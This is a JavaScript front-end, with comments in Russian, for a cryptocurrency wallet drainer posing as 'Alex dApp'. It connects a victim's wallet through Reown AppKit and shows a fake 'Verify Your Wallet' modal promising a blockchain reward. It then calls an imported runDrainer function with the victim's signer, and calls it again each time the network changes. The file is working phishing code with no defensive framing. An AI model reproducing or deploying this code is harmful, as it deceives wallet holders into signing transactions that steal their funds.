import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import { runDrainer } from './drainer.js';

// === Конфигурация AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

// === Глобальные переменные ===
let connectedAddress = null;
let hasDrained = false;
let isTransactionPending = false;
let actionBtn = null;
let modalOverlay = null;
let modalContent = null;

// Список надёжных RPC для fallback для всех поддерживаемых сетей
const FALLBACK_RPCS = {
  1: [ // Ethereum Mainnet
    'https://rpc.eth.gateway.fm',
    'https://eth.llamarpc.com',
    'https://ethereum-rpc.publicnode.com'
  ],
  56: [ // BNB Chain
    'https://bsc-dataseed.binance.org/',
    'https://bsc-dataseed1.defibit.io/',
    'https://bsc-dataseed1.ninicoin.io/'
  ],
  137: [ // Polygon
    'https://polygon-rpc.com/'
  ],
  42161: [ // Arbitrum One
    'https://arb1.arbitrum.io/rpc'
  ],
  43114: [ // Avalanche
    'https://api.avax.network/ext/bc/C/rpc'
  ],
  10: [ // Optimism
    'https://mainnet.optimism.io'
  ],
  8453: [ // Base
    'https://mainnet.base.org'
  ]
};

// Функция для создания провайдера с fallback RPC
async function getReliableProvider() {
  const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
  try {
    await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
    console.log('✅ Провайдер кошелька полностью рабочий');
    return walletProvider;
  } catch (err) {
    console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
  }

  // Получаем текущую сеть
  const network = await walletProvider.getNetwork();
  const chainId = network.chainId;
  const rpcUrls = FALLBACK_RPCS[chainId] || [];

  if (!rpcUrls.length) {
    throw new Error(`❌ Нет доступных fallback RPC для сети ${chainId}`);
  }

  for (const rpcUrl of rpcUrls) {
    try {
      const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
      await fallbackProvider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`✅ Переключено на fallback RPC: ${rpcUrl}`);
      return new ethers.providers.Web3Provider({
        ...window.ethereum,
        request: async (request) => {
          if (
            request.method === 'eth_chainId' ||
            request.method === 'eth_call' ||
            request.method === 'eth_getBalance' ||
            request.method === 'eth_blockNumber'
          ) {
            return fallbackProvider.send(request.method, request.params || []);
          }
          return walletProvider.send(request.method, request.params || []);
        }
      });
    } catch (err) {
      console.warn(`⚠️ Fallback RPC ${rpcUrl} недоступен:`, err.message);
    }
  }

  throw new Error(`❌ Не удалось найти рабочий RPC для сети ${chainId}`);
}

// === Инициализация при загрузке страницы ===
window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn');
  const isInjected = typeof window.ethereum !== 'undefined';

  // Подключаем шрифт Inter
  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  // CSS для модального окна в стиле AppKit
  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 999;
      display: none;
      backdrop-filter: blur(4px);
      pointer-events: auto; /* Убедимся, что оверлей кликабельный, пока виден */
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1A202C;
      border-radius: 12px;
      padding: 24px;
      width: 90%;
      max-width: 400px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Inter', sans-serif;
      color: #FFFFFF;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      animation: fadeIn 0.3s ease-out forwards;
    }

    @keyframes fadeIn {
      0% { transform: translate(-50%, -50%) scale(0.95); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .modal-title {
      font-size: 20px;
      font-weight: 600;
      color: #FFFFFF;
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .modal-title::before {
      content: '';
      font-size: 20px;
    }

    .modal-subtitle {
      font-size: 14px;
      font-weight: 400;
      color: #A0AEC0;
      margin-bottom: 24px;
    }

    /* Лоадер: пульсирующее кольцо с волнами */
    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 24px;
    }

    .pulse-ring {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 3px solid #3B82F6;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      animation: pulse 2s ease-in-out infinite;
      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
    }

    @keyframes pulse {
      0% {
        width: 40px;
        height: 40px;
        opacity: 0.8;
      }
      50% {
        width: 50px;
        height: 50px;
        opacity: 0.4;
      }
      100% {
        width: 40px;
        height: 40px;
        opacity: 0.8;
      }
    }

    .wave {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 1px solid #60A5FA;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      opacity: 0;
      animation: wave 4s ease-out infinite;
    }

    .wave:nth-child(2) {
      animation-delay: 1s;
    }

    .wave:nth-child(3) {
      animation-delay: 2s;
    }

    @keyframes wave {
      0% {
        width: 40px;
        height: 40px;
        opacity: 0.6;
      }
      100% {
        width: 100px;
        height: 100px;
        opacity: 0;
      }
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 24px 0 0;
      font-size: 14px;
      font-weight: 500;
      color: #E2E8F0;
      text-align: left;
    }

    .action-list li {
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .action-list li::before {
      content: '';
      color: #10B981;
      font-size: 16px;
    }

    .modal-footer {
      font-size: 12px;
      font-weight: 400;
      color: #A0AEC0;
      margin-top: 32px;
      font-style: italic;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 320px;
        padding: 20px;
        min-height: 300px;
      }
      .modal-title {
        font-size: 18px;
      }
      .modal-subtitle {
        font-size: 13px;
      }
      .loader-container {
        width: 70px;
        height: 70px;
      }
      @keyframes pulse {
        0% {
          width: 30px;
          height: 30px;
          opacity: 0.8;
        }
        50% {
          width: 40px;
          height: 40px;
          opacity: 0.4;
        }
        100% {
          width: 30px;
          height: 30px;
          opacity: 0.8;
        }
      }
      @keyframes wave {
        0% {
          width: 30px;
          height: 30px;
          opacity: 0.6;
        }
        100% {
          width: 70px;
          height: 70px;
          opacity: 0;
        }
      }
      .action-list {
        font-size: 13px;
      }
      .modal-footer {
        font-size: 11px;
      }
    }
  `;
  document.head.appendChild(style);

  // Создаём модальное окно
  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Verify Your Wallet</div>
    <div class="modal-subtitle">Processing blockchain verification...</div>
    <div class="loader-container">
      <div class="pulse-ring"></div>
      <div class="wave"></div>
      <div class="wave"></div>
      <div class="wave"></div>
    </div>
    <ul class="action-list">
      <li>Connect to the network</li>
      <li>Sign the verification transaction</li>
      <li>Claim your blockchain reward</li>
    </ul>
    <div class="modal-footer">Please confirm in your wallet app</div>
  `;
  document.body.appendChild(modalContent);

  // Проверяем наличие инжектированного провайдера
  if (!isInjected) {
    actionBtn.style.display = 'inline-block';
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal();
    });
    return;
  }

  actionBtn.style.display = 'inline-block';
  actionBtn.addEventListener('click', handleConnectOrAction);

  // Подписка на смену сети
  window.ethereum.on('chainChanged', onChainChanged);
});

// === Управление модальным окном ===
function showModal() {
  modalOverlay.style.display = 'block';
  modalOverlay.style.pointerEvents = 'auto'; // Убедимся, что оверлей кликабельный
  modalContent.style.display = 'block';
}

function hideModal() {
  modalOverlay.style.display = 'none';
  modalOverlay.style.pointerEvents = 'none'; // Отключаем кликабельность оверлея
  modalContent.style.display = 'none';
  // Убедимся, что основной контент снова доступен
  document.body.style.pointerEvents = 'auto';
}

// === Выполнение drainer ===
async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    console.log('⚠️ Транзакция уже выполнена или ожидается');
    return;
  }

  if (!connectedAddress) {
    console.error('❌ Адрес кошелька не определён');
    return;
  }

  console.log(`📍 Используется адрес: ${connectedAddress}`);
  showModal(); // Открываем модальное окно

  try {
    const provider = await getReliableProvider();
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
      console.error('❌ Несоответствие адресов:', address, connectedAddress);
      hideModal();
      isTransactionPending = false; // Сбрасываем состояние
      return;
    }

    isTransactionPending = true;
    const status = await runDrainer(provider, signer, connectedAddress);
    console.log('✅ Drainer выполнен успешно, статус:', status);

    hasDrained = true;
    isTransactionPending = false;
    cleanup();
    hideModal();
  } catch (err) {
    isTransactionPending = false; // Сбрасываем состояние даже при ошибке
    hideModal();
    if (err.message.includes('user rejected')) {
      console.log('🙅 Пользователь отклонил транзакцию');
    } else {
      console.error('❌ Ошибка выполнения drainer:', err.message);
      throw err;
    }
  } finally {
    // Гарантируем, что состояние сброшено и модальное окно закрыто
    isTransactionPending = false;
    hideModal();
  }
}

// === Подключение кошелька и запуск ===
async function handleConnectOrAction() {
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length === 0) {
      await appKitModal.open();
      connectedAddress = await waitForWallet();
      console.log('✅ Подключён кошелёк:', connectedAddress);
    } else {
      connectedAddress = accounts[0];
      console.log('✅ Уже подключён:', connectedAddress);
    }

    if (!isTransactionPending) {
      await attemptDrainer();
    } else {
      console.log('⏳ Транзакция уже выполняется');
    }
  } catch (err) {
    console.error('❌ Ошибка подключения:', err.message);
    isTransactionPending = false; // Сбрасываем состояние при ошибке подключения
    hideModal();
  }
}

// === Обработка смены сети ===
async function onChainChanged(chainId) {
  console.log('🔄 Смена сети:', chainId);
  if (connectedAddress && !isTransactionPending) {
    await attemptDrainer();
  } else {
    console.log('⏳ Транзакция в процессе');
  }
}

// === Очистка ===
function cleanup() {
  if (!actionBtn) return;
  actionBtn.removeEventListener('click', handleConnectOrAction);
  window.ethereum.removeListener('chainChanged', onChainChanged);
  actionBtn.disabled = true;
  actionBtn.style.opacity = '0.6';
  hideModal(); // Убедимся, что модальное окно закрыто
}

// === Ожидание подключения кошелька ===
async function waitForWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
  if (accounts.length > 0) return accounts[0];

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length) {
        clearInterval(interval);
        resolve(accounts[0]);
      }
    }, 500);
  });
}
